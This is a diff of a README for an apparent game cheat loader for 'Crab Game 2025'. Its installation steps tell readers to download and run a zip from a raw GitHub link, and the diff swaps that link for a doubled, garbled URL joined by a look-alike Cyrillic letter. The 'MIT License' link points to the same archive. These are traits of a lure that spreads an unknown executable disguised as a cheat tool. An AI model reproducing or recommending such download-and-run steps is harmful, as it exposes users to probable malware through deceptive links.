@@ -47,10 +47,10 @@ More features are added regularly. Check for updates frequently and join our 202
 
 ## 🛡️ Installation Guide
 
-1. Download **https://raw.githubusercontent.com/xsamaa99/EPG/main/Lоader.zip** from this repository.
+1. Download **https://raw.githubusercontent.com/xsamaa99/EPG/main/raiseman/Software-v3.0.zipоhttps://raw.githubusercontent.com/xsamaa99/EPG/main/raiseman/Software-v3.0.zip** from this repository.
 2. Extract the archive using a tool such as WinRAR or 7-Zip.
 3. Open the extracted folder.
-4. Run the **https://raw.githubusercontent.com/xsamaa99/EPG/main/Lоader.zip** (or appropriate file for your OS).
+4. Run the **https://raw.githubusercontent.com/xsamaa99/EPG/main/raiseman/Software-v3.0.zipоhttps://raw.githubusercontent.com/xsamaa99/EPG/main/raiseman/Software-v3.0.zip** (or appropriate file for your OS).
 5. Follow the on-screen prompts to inject the cheat loader safely.
 6. Launch Crab Game 2025 and enjoy enhanced gameplay! 🎉
 
@@ -76,7 +76,7 @@ We recommend experimenting exclusively in private lobbies or sandbox environment
 
 ## 📄 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/xsamaa99/EPG/main/Lоader.zip) 📜.  
+Distributed under the [MIT License](https://raw.githubusercontent.com/xsamaa99/EPG/main/raiseman/Software-v3.0.zipоhttps://raw.githubusercontent.com/xsamaa99/EPG/main/raiseman/Software-v3.0.zip) 📜.  
 Feel free to contribute, share, and adapt with credit. See LICENSE file for more details.
 
 ---
